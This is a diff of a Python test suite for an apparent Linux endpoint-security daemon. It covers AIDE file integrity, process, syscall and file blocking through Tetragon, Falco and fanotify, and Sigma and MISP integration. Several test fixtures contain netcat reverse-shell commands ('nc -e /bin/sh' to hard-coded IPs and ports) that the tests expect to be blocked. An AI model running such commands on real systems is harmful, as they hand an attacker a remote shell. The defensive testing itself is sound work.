+        probe_misp = misp.probe_integration()
+        self.assertIn("mode", probe_misp)
+        self.assertIn("library_installed", probe_misp)
+
+        sigma = SigmaEngine()
+        probe_sigma = sigma.probe_integration()
+        self.assertIn("mode", probe_sigma)
+        self.assertIn("library_installed", probe_sigma)
 
         scanner = Scanner()
-        self.assertTrue(hasattr(scanner, "sigma_manager"))
-        sig_info = scanner.get_signatures_info()
-        self.assertIn("sigma", sig_info)
-        self.assertTrue(sig_info["sigma"].get("available"))
-        self.assertGreaterEqual(sig_info["sigma"].get("rules_count", 0), 6)
+        manifest = scanner.get_engine_manifest()
+        self.assertIn("yarax", manifest)
+        self.assertIn("clamav", manifest)
+        self.assertIn("sigma", manifest)
+        self.assertIn("heuristic", manifest)
 
-        ebpf_caps = EBPFMonitor.probe_kernel_capabilities()
-        self.assertIn("has_sigma", ebpf_caps)
-        self.assertTrue(ebpf_caps["has_sigma"])
+        daemon = ConstantineDaemon(is_test=True)
+        status, data, msg = daemon.dispatch_ipc_command("GET_INTEGRATIONS_STATUS", {})
+        self.assertEqual(status, "OK")
+        self.assertIn("tetragon", data)
+        self.assertIn("falco", data)
+        self.assertIn("wazuh", data)
+        self.assertIn("osquery", data)
+        self.assertIn("misp", data)
+        self.assertIn("sigma", data)
+        self.assertIn("clamav", data)
 
+    def test_aide_integrity_checker_baseline_and_probing(self):
+        """
+        Verifica el Verificador de Integridad de Archivos Críticos basado en AIDE:
+        1. Probing dinámico (NATIVE_AIDE_BINARY vs STANDALONE_BASELINE_ENGINE).
+        2. Creación e inicialización de línea base criptográfica (SHA-256, permisos, tamaño).
+        3. Verificación de estado íntegro (CLEAN).
+        4. Detección de manipulaciones no autorizadas (INTEGRITY_VIOLATION, HASH_MISMATCH, eliminación).
+        5. Comando IPC CHECK_AIDE_INTEGRITY en el demonio.
+        """
+        from core.engine.aide_integrity import AIDEIntegrityChecker
 
-    def test_firewall_four_states_and_user_administration(self):
-        """Verifica la arquitectura 5.x de cortafuegos: detección de los 4 estados y administración exclusiva del usuario."""
-        from core.engine.firewall import NetworkQuarantine, FirewallState
-        nq = NetworkQuarantine(use_nftables=False)
+        aide_dir = tempfile.mkdtemp()
+        baseline_file = os.path.join(aide_dir, "aide_baseline.json")
 
-        # 1. Comprobar FirewallState Enum
-        self.assertEqual(FirewallState.INSTALLED_ACTIVE.value, "INSTALLED_ACTIVE")
-        self.assertEqual(FirewallState.INSTALLED_INACTIVE.value, "INSTALLED_INACTIVE")
-        self.assertEqual(FirewallState.NOT_INSTALLED.value, "NOT_INSTALLED")
-        self.assertEqual(FirewallState.UNKNOWN.value, "UNKNOWN")
+        critical_file = os.path.join(aide_dir, "critical_binary.bin")
+        with open(critical_file, "wb") as f:
+            f.write(b"ORIGINAL_SYSTEM_BINARY_CONTENT_V1")
 
-        # 2. Consultar get_firewall_status
-        status = nq.get_firewall_status()
-        self.assertIsInstance(status, dict)
-        self.assertIn("state", status)
-        self.assertIn("state_label", status)
-        self.assertIn("ufw_installed", status)
-        self.assertIn("gufw_installed", status)
-        self.assertIn("is_active", status)
-        self.assertIn(status["state"], [
-            FirewallState.INSTALLED_ACTIVE.value,
-            FirewallState.INSTALLED_INACTIVE.value,
-            FirewallState.NOT_INSTALLED.value,
-            FirewallState.UNKNOWN.value
-        ])
+        checker = AIDEIntegrityChecker(baseline_path=baseline_file, monitored_dirs=[aide_dir])
 
-        # 3. Simulación de los 4 estados
-        with unittest.mock.patch("shutil.which", return_value=None):
-            st_not = nq.get_firewall_status()
-            self.assertEqual(st_not["state"], FirewallState.NOT_INSTALLED.value)
-            self.assertEqual(st_not["state_label"], "Firewall no instalado")
-            self.assertFalse(st_not["is_active"])
+        # 1. Probing
+        probe = checker.probe_integration()
+        self.assertIn("mode", probe)
+        self.assertIn("AIDE", probe["name"])
 
-        with unittest.mock.patch("shutil.which", side_effect=lambda x: "/usr/bin/gufw" if x == "gufw" else None):
-            st_unk = nq.get_firewall_status()
-            self.assertEqual(st_unk["state"], FirewallState.UNKNOWN.value)
+        # 2. Inicializar línea base
+        init_res = checker.init_baseline(target_dirs=[aide_dir])
+        self.assertEqual(init_res["status"], "INITIALIZED")
+        self.assertGreaterEqual(init_res["files_indexed"], 1)
+        self.assertTrue(os.path.exists(baseline_file))
 
-        with unittest.mock.patch("shutil.which", side_effect=lambda x: f"/usr/bin/{x}" if x in ("ufw", "gufw") else None):
-            with unittest.mock.patch("subprocess.run") as mock_run:
-                mock_run.return_value = unittest.mock.MagicMock(stdout="Status: active\n", returncode=0)
-                st_act = nq.get_firewall_status()
-                self.assertEqual(st_act["state"], FirewallState.INSTALLED_ACTIVE.value)
-                self.assertTrue(st_act["is_active"])
+        # 3. Verificación de integridad limpia
+        clean_res = checker.check_integrity()
+        self.assertEqual(clean_res["status"], "CLEAN")
+        self.assertEqual(clean_res["violations_count"], 0)
 
-                mock_run.return_value = unittest.mock.MagicMock(stdout="Status: inactive\n", returncode=0)
-                st_inact = nq.get_firewall_status()
-                self.assertEqual(st_inact["state"], FirewallState.INSTALLED_INACTIVE.value)
-                self.assertFalse(st_inact["is_active"])
+        # 4. Simulación de manipulación hostil
+        with open(critical_file, "wb") as f:
+            f.write(b"TAMPERED_MALICIOUS_ROOTKIT_CODE")
 
-        # 4. Verificación de activación inicial segura sin sobrescribir reglas
-        with unittest.mock.patch("shutil.which", return_value="/usr/bin/ufw"):
-            with unittest.mock.patch("subprocess.run") as mock_run:
-                mock_run.return_value = unittest.mock.MagicMock(stdout="Status: active\n", returncode=0)
-                ok, msg = nq.activate_initial_firewall()
-                self.assertTrue(ok)
+        tamper_res = checker.check_integrity()
+        self.assertEqual(tamper_res["status"], "INTEGRITY_VIOLATION")
+        self.assertEqual(tamper_res["violations_count"], 1)
+        self.assertIn("HASH_MISMATCH", tamper_res["modified"][0]["issues"])
 
-        # 5. Verificación de launch_gufw
-        with unittest.mock.patch("shutil.which", return_value="/usr/bin/gufw"):
-            with unittest.mock.patch("subprocess.Popen") as mock_popen:
-                self.assertTrue(nq.launch_gufw())
-                mock_popen.assert_called_once()
+        # 5. Despacho IPC en daemon
+        daemon = ConstantineDaemon(is_test=True)
+        status, data, msg = daemon.dispatch_ipc_command("CHECK_AIDE_INTEGRITY", {})
+        self.assertEqual(status, "OK")
+        self.assertIn("status", data)
 
-    def test_proton_vpn_integration_and_separation_of_concerns(self):
-        """Verifica la arquitectura 5.x de VPN: instalación y acceso directo sin apropiarse de conexiones."""
-        from core.engine.vpn_manager import VPNManager
-        vpn_mgr = VPNManager()
+        shutil.rmtree(aide_dir)
 
-        # 1. Inspección de métodos del gestor
-        self.assertTrue(hasattr(vpn_mgr, "find_proton_vpn"))
-        self.assertTrue(hasattr(vpn_mgr, "is_installed"))
-        self.assertTrue(hasattr(vpn_mgr, "launch"))
-        self.assertTrue(hasattr(vpn_mgr, "get_status_info"))
+    def test_security_decision_engine_and_blocking_capabilities(self):
+        """
+        Verifica el Motor de Decisiones de Seguridad (SecurityDecisionEngine) y la matriz de bloqueo real:
+        1. Bloqueo de Procesos (Tetragon + BPF LSM / SIGKILL Fallback):
+           - Proceso sospechoso denegado.
+           - Proceso legítimo permitido.
+        2. Bloqueo Conductual (Falco - Complemento Opcional):
+           - Alerta crítica -> Aislamiento de red (Firewall drop).
+           - Posibilidad de desactivar/activar Falco como complemento.
+        3. Bloqueo de Acceso a Archivos (Fanotify):
+           - Archivo malicioso -> FAN_DENY + Cuarentena atómica en Baúl.
+        4. Verificación de capacidades reales mediante IPC GET_BLOCKING_CAPABILITIES.
+        """
+        from core.engine.security_decision_engine import SecurityDecisionEngine
 
-        # 2. Verificar telemetría y política de no intrusión
-        info = vpn_mgr.get_status_info()
-        self.assertIsInstance(info, dict)
-        self.assertIn("installed", info)
-        self.assertIn("provider", info)
-        self.assertEqual(info["provider"], "Proton VPN")
-        self.assertTrue(info.get("managed_by_user", False))
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        firewall = FirewallManager()
+        engine = SecurityDecisionEngine(vault=vault, firewall=firewall)
 
-        # 3. Lanzamiento mediante acceso directo
-        with unittest.mock.patch.object(vpn_mgr, "find_proton_vpn", return_value="/usr/bin/protonvpn"):
-            with unittest.mock.patch("subprocess.Popen") as mock_popen:
-                self.assertTrue(vpn_mgr.launch())
-                mock_popen.assert_called_once_with(["/usr/bin/protonvpn"], start_new_session=True)
+        # 1. Tetragon / Proceso Malicioso
+        tetragon = TetragonMonitor()
+        dec_proc = engine.evaluate_process_execution(105, "/bin/nc", ["-e", "/bin/sh", "1.2.3.4", "4444"], tetragon_monitor=tetragon)
+        self.assertTrue(dec_proc.is_blocked)
+        self.assertIn("TETRAGON", dec_proc.primary_engine)
+        self.assertIn(dec_proc.enforcement_action, ("BPF_LSM_EPERM", "SIGKILL_CONTAINMENT"))
 
+        # Proceso Limpio
+        dec_clean = engine.evaluate_process_execution(106, "/usr/bin/curl", ["https://example.com"], tetragon_monitor=tetragon)
+        self.assertFalse(dec_clean.is_blocked)
+        self.assertEqual(dec_clean.enforcement_action, "ALLOW")
 
+        # 2. Falco / Syscall Conductual
+        falco = FalcoMonitor()
+        dec_falco = engine.evaluate_behavioral_syscall({
+            "proc": "nc -e /bin/bash 192.168.1.50 9001",
+            "fd": "3",
+            "pid": 7722,
+            "dport": 9001
+        }, falco_monitor=falco)
+        self.assertTrue(dec_falco.is_blocked)
+        self.assertEqual(dec_falco.enforcement_action, "NETWORK_ISOLATE")
+        self.assertTrue(dec_falco.network_isolated)
 
-    def test_constantine_data_flow_and_architecture_rules(self):
-        """Verifica el ciclo de trabajo completo, Data Flow y las 10 Reglas de Arquitectura."""
-        import event_manager
-        from core.engine.event_manager import (
-            ConstantineEventManager,
-            SecurityDecisionEngine,
-            EventCorrelation,
-            SecurityVerdict,
-            SecurityAction,
-            EventSource,
-            EventType,
-            SecurityEvent,
-            PillarAnalysisResult,
-            ARCHITECTURE_RULES
-        )
+        # Desactivación opcional de Falco
+        engine.set_falco_enabled(False)
+        dec_falco_off = engine.evaluate_behavioral_syscall({"proc": "nc -e /bin/bash", "pid": 7722}, falco_monitor=falco)
+        self.assertFalse(dec_falco_off.is_blocked)
+        engine.set_falco_enabled(True)
 
-        # 1. Validar las 10 Reglas de Arquitectura
-        self.assertEqual(len(ARCHITECTURE_RULES), 10)
-        em = ConstantineEventManager(scanner=self.scanner, vault=self.vault)
-        rules = em.verify_architecture_rules()
-        self.assertEqual(len(rules), 10)
-        for r in rules:
-            self.assertTrue(r.get("compliant"))
+        # 3. Fanotify / Acceso a Archivos
+        scanner = Scanner()
+        bad_path = os.path.join(self.temp_dir.name, "bad_script.sh")
+        with open(bad_path, "w") as f:
+            f.write("nc -e /bin/sh 10.0.0.1 4444")
+        fd = os.open(bad_path, os.O_RDONLY)
+        dec_file = engine.evaluate_file_access(bad_path, fd, pid=470, comm="test", scanner=scanner)
+        os.close(fd)
+        self.assertTrue(dec_file.is_blocked)
+        self.assertEqual(dec_file.enforcement_action, "FANOTIFY_DENY")
+        self.assertTrue(dec_file.quarantined)
 
-        # 2. Simulación de Flujo: Evento Limpio (CLEAN -> ALLOW)
-        clean_file = os.path.join(self.tmp, "clean_app.bin")
-        with open(clean_file, "wb") as f:
-            f.write(b"#!/bin/bash\necho clean application\n")
+        # 5. Integración de Seguridad Integral: osquery, AIDE, Sigma y MISP
+        # 5a. osquery postura
+        osq = OSQueryDiagnostics()
+        dec_osq = engine.evaluate_system_posture(osq)
+        self.assertFalse(dec_osq.is_blocked)
+        self.assertEqual(dec_osq.primary_engine, "OSQUERY")
 
-        v_clean = em.handle_filesystem_event(clean_file)
-        self.assertEqual(v_clean.verdict, SecurityVerdict.CLEAN)
-        self.assertEqual(v_clean.action, SecurityAction.ALLOW)
+        # 5b. AIDE integridad
+        aide_checker = AIDEIntegrityChecker(baseline_path=os.path.join(self.temp_dir.name, "decision_aide.json"))
+        dec_aide = engine.evaluate_system_integrity(aide_checker)
+        self.assertIn("AIDE", dec_aide.primary_engine)
 
-        # 3. Simulación de Flujo: Evento de Sistema (TETRAGON -> Event Manager -> Correlation)
-        ev_tetragon = SecurityEvent(
-            event_id="tetragon_exec_001",
-            source=EventSource.TETRAGON,
-            event_type=EventType.PROCESS_EXEC,
-            path=clean_file,
-            pid=4455,
-            comm="safe_proc"
-        )
-        v_tet = em.process_event(ev_tetragon)
-        self.assertIn(v_tet.verdict, [SecurityVerdict.CLEAN, SecurityVerdict.SUSPICIOUS, SecurityVerdict.MALICIOUS])
+        # 5c. Reglas Sigma conectadas en ejecución de proceso
+        sigma_eng = SigmaEngine()
+        dec_sigma = engine.evaluate_process_execution(999, "/usr/bin/visudo", ["/etc/sudoers"], sigma_engine=sigma_eng)
+        self.assertTrue(dec_sigma.is_blocked)
+        self.assertEqual(dec_sigma.primary_engine, "SIGMA")
 
-        # 4. Simulación de Flujo: Amenaza Maliciosa (MALICIOUS -> BLOCK/ISOLATE -> QUARANTINE -> SECURE STORAGE)
-        mal_file = os.path.join(self.tmp, "hostile_dropper.sh")
-        with open(mal_file, "wb") as f:
-            f.write(b"#!/bin/bash\nnc -e /bin/sh 192.168.1.100 4444\n")
+        # 5d. MISP como fuente opcional de inteligencia
+        misp_mgr = MISPFeedManager(intel_engine=scanner.intel)
+        self.assertTrue(misp_mgr.enabled)
+        misp_mgr.set_enabled(False)
+        self.assertIsNone(misp_mgr.lookup_ioc("198.51.100.55"))
+        misp_mgr.set_enabled(True)
+        self.assertIsNotNone(misp_mgr.lookup_ioc("198.51.100.55"))
 
-        v_mal = em.handle_filesystem_event(mal_file, pid=9911)
-        self.assertEqual(v_mal.verdict, SecurityVerdict.MALICIOUS)
-        self.assertEqual(v_mal.action, SecurityAction.BLOCK_ISOLATE)
-        self.assertIsNotNone(v_mal.threat_name)
+        # 4 & 5e. IPC GET_BLOCKING_CAPABILITIES y Comandos MISP en Demonio
+        daemon = ConstantineDaemon(is_test=True)
+        status, caps, msg = daemon.dispatch_ipc_command("GET_BLOCKING_CAPABILITIES", {})
+        self.assertEqual(status, "OK")
+        self.assertIn("filesystem_on_access", caps)
+        self.assertEqual(caps["filesystem_on_access"]["capability"], "BLOCK_PREVENTIVE")
+        self.assertIn("process_execution_enforcement", caps)
+        self.assertIn("behavioral_syscall_enforcement", caps)
+        self.assertIn("telemetry_tracepoints", caps)
+        self.assertEqual(caps["telemetry_tracepoints"]["capability"], "OBSERVATION_ONLY")
 
-        # 5. Verificación de Telemetría y Estado del Event Manager
-        status = em.get_status_info()
-        self.assertGreaterEqual(status["processed_events_count"], 3)
-        self.assertEqual(status["architecture_rules_count"], 10)
-
+        status_misp, data_misp, _ = daemon.dispatch_ipc_command("SET_MISP_ENABLED", {"enabled": False})
+        self.assertEqual(status_misp, "OK")
+        status_cfg, data_cfg, _ = daemon.dispatch_ipc_command("CONFIGURE_MISP_REMOTE", {"url": "https://misp.local", "api_key": "secret"})
+        self.assertEqual(status_cfg, "OK")
+        self.assertTrue(data_cfg["configured"])
+        status, caps, msg = daemon.dispatch_ipc_command("GET_BLOCKING_CAPABILITIES", {})
+        self.assertEqual(status, "OK")
+        self.assertIn("filesystem_on_access", caps)
+        self.assertEqual(caps["filesystem_on_access"]["capability"], "BLOCK_PREVENTIVE")
+        self.assertIn("process_execution_enforcement", caps)
+        self.assertIn("behavioral_syscall_enforcement", caps)
+        self.assertIn("telemetry_tracepoints", caps)
+        self.assertEqual(caps["telemetry_tracepoints"]["capability"], "OBSERVATION_ONLY")
 
 if __name__ == "__main__":
     unittest.main()
